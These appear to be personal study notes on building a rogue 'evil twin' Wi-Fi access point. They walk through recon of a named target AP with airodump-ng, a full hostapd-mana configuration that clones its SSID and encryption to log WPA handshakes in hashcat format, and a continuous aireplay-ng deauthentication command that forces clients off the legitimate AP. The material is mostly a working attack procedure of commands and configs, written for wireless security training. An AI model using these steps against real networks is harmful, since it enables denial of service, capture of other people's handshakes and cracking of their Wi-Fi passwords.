# 10. Rogue AP (Recon Target AP)

*AP in use that are not authorized by local network administrator*

*Takes the form of AP plugged into network without admin knowledge. Could also take form of maliciously-controlled AP that mimics existing approved AP*

**Purpose:** Create rogue AP and look for devices trying to connect to legit AP with same name.

**Scenario:** rogue AP is located near device and legit AP. Ideally device targeting is far enough away from intended AP that can make rogue AP more likely to be connected to

**Uses:** Grab WPA pre-shared keys

**Discovery**

Attacks more likely to succeed if match encryption details. Need to conduct recon against target to gather information

- Use airodump-ng to gather information about target
    
    `sudo airodump-ng -w discovery --output-format pcap wlan0mon`
    
- check its SSID, speed, and channel to recreate the information of the target AP
- After capturing for a bit, open the pcap file and filter for beacon packets using `wlan.fc.type_subtype == 0x08` and also ensure to include the filter for your target AP `&& wlan.ssid == "wifu"`

![Untitled](Untitled%205.png)

- tagged parameters
    - IEEEE 802.11 wireless management tree
        - Vendor specific: Microsoft corp.: WPA Information Element

the above section shows that AP supports WPA1 and existence of RSN information tells us that it also supports WPA2

Just from the pcap file, we are able to identify information about our target AP:

- It has an ESSID of Mostar
- It has a BSSID of FC:7A:2B:88:63:EF
- It uses WPA (TKIP/CCMP) and WPA2 (TKIP/CCMP)
- It uses a PSK
- It runs on channel 1

To create a Rogue AP, have to use hostapd-mana

- first setup the config file

```bash
cat Mostar-mana.conf
interface=wlan0
ssid=Mostar
channel=1
hw_mode=g
ieee80211n=1
```

- Use the interface of the WIFI card
- SSID and channel must match the target AP
- set IEEE parameter to match target AP (`ieee80211n=1`) [802.11n]
- set hardware mode to ‘g’ to match 2.4GHz, set to ‘a’ for 5GHz

Next set wpa parameter to ‘3’, enables both WPA and WPA2:

```bash
cat Mostar-mana.conf
interface=wlan0
ssid=Mostar
channel=1
hw_mode=g
ieee80211n=1
**wpa=3 (1 for WPA only, 2 for WPA2 only)
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP CCMP
rsn_pairwise=TKIP CCMP**
```

- set auth to PSK
- set key using wpa_passphrase [irrelevant]
- set TKIP/CCMP encryption w/ WPA1
- set wpa_pairwise to TKIP CCMP
- set rsn_pairwise to TKIP CCMP

Next set mana portion of hostapd-mana 

```bash
cat Mostar-mana.conf
interface=wlan0
ssid=Mostar
channel=1
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP
rsn_pairwise=TKIP CCMP
**mana_wpaout=/home/kali/mostar.hccapx**
```

- mana_wpaout specifies where to save captured handshakes in hashcat hccapx format
- each handshake captured will be appended to the file

How to tackle WPA3 APs

![Untitled](Untitled%206.png)

**Capturing Handshakes**

Start hostapd-mana using `sudo hostapd-mana <config-file.conf>`

- doing so, will allow devices to connect to our AP instead of the real AP if our signal is stronger than original AP.
- Since PSK is not configured and is incorrect, the devices trying to connect will fail
- But what we want to capture is the WPA1/WPA2 handshake logged by hostapd-mana

![Untitled](Untitled%207.png)

- Sometimes clients might cling on to weak connection to the actual target AP.
    - can be fixed by deauthing the client using `aireplay-ng`
    - have to connect a new WIFI card and start monitor mode on channel 1 using airmon-ng. channel should match with target AP
    - next run command against all clients connected to AP using `-a`:
        
        `sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan0mon`
        
    - `-0 0` indicates deauth but continuously send deauth attack packets.
    

Summary:

Useful to capture during WIFI assessments to capture handshakes or to target clients far from AP. When targets tried to connect to AP, able to capture just enough of WPA handshake to crack using aircrack-ng